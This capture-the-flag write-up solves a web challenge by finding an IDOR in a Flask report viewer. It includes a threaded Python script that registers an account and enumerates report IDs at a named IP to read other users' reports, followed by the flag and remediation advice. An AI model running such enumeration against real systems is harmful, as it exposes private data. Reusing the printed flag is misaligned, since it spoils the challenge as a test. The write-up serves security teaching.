# Intern Portal — Writeup

## Challenge information
- **Name:** challenge
- **Category:** web
- **Flag format:** `CIT{}`
- **Target:** `http://23.179.17.92:5001`

## Description
> The intern said they made a custom report application... but I don't think security was in mind.

That description strongly suggests a broken access control issue in some custom report system. For web challenges, that often means one of the following:
- unauthenticated access to protected resources,
- insecure direct object reference (IDOR),
- weak role checks,
- predictable object IDs.

This challenge turned out to be an **IDOR / broken access control** vulnerability in the report viewer.

---

## Initial reconnaissance

I started by checking the local challenge files and the provided notes/description to identify the target and any hints.

### Files present
- `desc.txt`
- `flag_format.txt`
- `notes.md`

### Key information extracted
From `desc.txt`:
- The application is hosted at `http://23.179.17.92:5001`

From `flag_format.txt`:
- The flag format is `CIT{}`

---

## Web fingerprinting

The next step was to inspect the web application itself.

### Root page behavior
A request to `/` returned a redirect rather than content directly.

### Important observations
- The app was running on **Flask/Werkzeug**.
- The response headers exposed:
  - `Server: Werkzeug/... Python/3.11...`
- The app redirected users depending on authentication state.

This told me:
1. It is likely a small custom Flask app.
2. Session-based authentication is being used.
3. There may only be a small number of routes, so manual enumeration could be effective.

### Route probing results
The routes observed early were:
- `/login` → reachable
- `/register` → reachable
- `/report` → present but protected / dependent on workflow

Other guessed routes such as `/admin`, `/reports`, `/api`, etc. did not appear useful.

### Interpretation
This matched the challenge description very well: a small custom application with auth plus a single report feature. That made the report workflow the main attack surface.

---

## Authentication workflow

I visited the login and registration pages and observed that both were simple HTML forms.

### What mattered here
- There was no obvious CSRF token requirement.
- Registration was open.
- Logging in set a Flask session cookie.

Because registration was available, I created my own user instead of trying to bypass authentication. This is a common and safe first step in web CTFs because it gives a legitimate baseline view of the application.

### Registration/login result
- Registering a new account succeeded.
- Logging in succeeded.
- After authentication, the app redirected to the user landing page/dashboard.

An earlier `405` during testing came from incorrectly following a POST redirect as another POST. Once I fetched the redirected page properly with a GET, the workflow behaved normally.

---

## Understanding the report feature

Once authenticated, I focused on the report functionality.

### Key discovery
The dashboard allowed report creation via **`POST /report`**.

I created sample reports to understand:
- what inputs were accepted,
- how the application stored reports,
- how a report was viewed afterward.

### Observation after creating a report
Creating a report resulted in a report view page tied to a numeric identifier.

The report view used a URL pattern like:

```http
/report?id=<number>
```

This is the critical detail.

Any time a resource is fetched by a simple numeric `id`, an IDOR should immediately be tested.

---

## Testing for IDOR

After creating my own report, I first confirmed that my own report could be viewed successfully.

Then I changed only the numeric `id` parameter to other values.

### Example pattern
```http
GET /report?id=10701
GET /report?id=10700
GET /report?id=10699
...
```

### Observation
The application returned valid report pages for report IDs that did **not** belong to my account.

This proved that:
- the application checked whether the user was logged in,
- but it **did not verify ownership** of the requested report.

That is the classic definition of an **Insecure Direct Object Reference (IDOR)** / **broken access control** vulnerability.

### Security impact
Any authenticated user could read arbitrary reports simply by changing the `id` value.

Since the challenge description explicitly mentioned a custom report app and poor security, this was almost certainly the intended path.

---

## Exploitation strategy

At this point the challenge was not about achieving code execution or bypassing login. The exploit was straightforward:

1. Register a normal user.
2. Log in.
3. Request `/report?id=<n>` for many numeric IDs.
4. Search the report contents for `CIT{...}`.

Because report IDs appeared sequential, enumeration was practical.

### First attempt
I initially tried a broader linear scrape across many report IDs. That worked conceptually, but the scan hit a time limit before completing.

### Optimization
To speed things up, I switched to a **threaded enumeration** approach using Python `requests` with concurrent workers.

The script:
- registered and logged in automatically,
- reused the authenticated session cookie,
- fetched report pages in parallel,
- extracted report content,
- searched for the regex pattern `CIT\{[^}]+\}`,
- stopped as soon as a flag was found.

---

## Exploit script

This is the effective exploitation script used to retrieve the flag:

```python
import requests, re, time, html, concurrent.futures

base='http://23.179.17.92:5001'
s=requests.Session()
user=f'u{int(time.time())}'
password='P@ssw0rd123'

s.post(base+'/register', data={'username': user, 'password': password})
s.post(base+'/login', data={'username': user, 'password': password})

cookies = s.cookies.get_dict()
pat = re.compile(r'CIT\{[^}]+\}')
rc = re.compile(r'<div class="report-content">\s*(.*?)\s*</div>', re.S)

def fetch(rid):
    ss = requests.Session()
    ss.cookies.update(cookies)
    r = ss.get(f'{base}/report?id={rid}', timeout=5)
    if r.status_code != 200:
        return None

    m = pat.search(r.text)
    if m:
        return ('flag', rid, m.group(0))

    m2 = rc.search(r.text)
    if not m2:
        return None

    content = html.unescape(m2.group(1)).strip()
    low = content.lower()
    if any(x in low for x in ['flag', 'admin', 'intern', 'secret', 'token', 'cit{']):
        return ('interesting', rid, content[:300])

    return None

for start, end in [(1,3000), (3001,6000), (6001,9000), (9001,10750)]:
    print(f'## scanning {start}-{end}')
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        futs = {ex.submit(fetch, rid): rid for rid in range(start, end+1)}
        for fut in concurrent.futures.as_completed(futs):
            res = fut.result()
            if not res:
                continue
            kind, rid, value = res
            print(kind.upper(), rid, value)
            if kind == 'flag':
                raise SystemExit
```

---

## Result
The scan quickly found a report containing the flag:

- **Report ID:** `347`
- **Flag:** `CIT{Acc355_C0ntr0l_M@tt3rs!}`

---

## Why the vulnerability exists

The backend likely used logic equivalent to:

```python
report = Report.query.get(request.args['id'])
return render_template('report.html', report=report)
```

instead of verifying that the requested report belonged to the current authenticated user, such as:

```python
report = Report.query.filter_by(id=request.args['id'], owner_id=session['user_id']).first()
```

or enforcing role-based access checks where appropriate.

### The real flaw
The application performed:
- **authentication**: “is the user logged in?”

but failed to perform:
- **authorization**: “is this user allowed to view this specific report?”

That distinction is exactly what makes IDOR vulnerabilities so common and dangerous.

---

## Observations that led to the solution

These were the most important observations during the solve:

1. **The challenge description explicitly pointed at a custom report application.**  
   That made the report workflow the highest-priority target.

2. **The app was small and custom-built in Flask.**  
   Small custom apps in CTFs often contain direct object access bugs.

3. **Report viewing used a numeric `id` parameter.**  
   Numeric IDs are a major clue for IDOR testing.

4. **A logged-in user could access reports by arbitrary ID.**  
   This confirmed broken object-level authorization.

5. **The flag was stored in another user’s report.**  
   Enumerating report IDs was enough to retrieve it.

---

## Remediation advice

If this were a real application, the fix would be straightforward but essential:

- Enforce per-object authorization on every report fetch.
- Never trust client-supplied identifiers by themselves.
- Scope report queries to the current user unless admin access is explicitly intended.
- Return `403 Forbidden` or `404 Not Found` when a user requests another user’s report.
- Consider non-sequential identifiers only as a defense-in-depth measure, not the primary fix.

### Example secure approach
```python
report = Report.query.filter_by(id=report_id, owner_id=current_user.id).first_or_404()
```

---

## Final flag

```text
CIT{Acc355_C0ntr0l_M@tt3rs!}
```
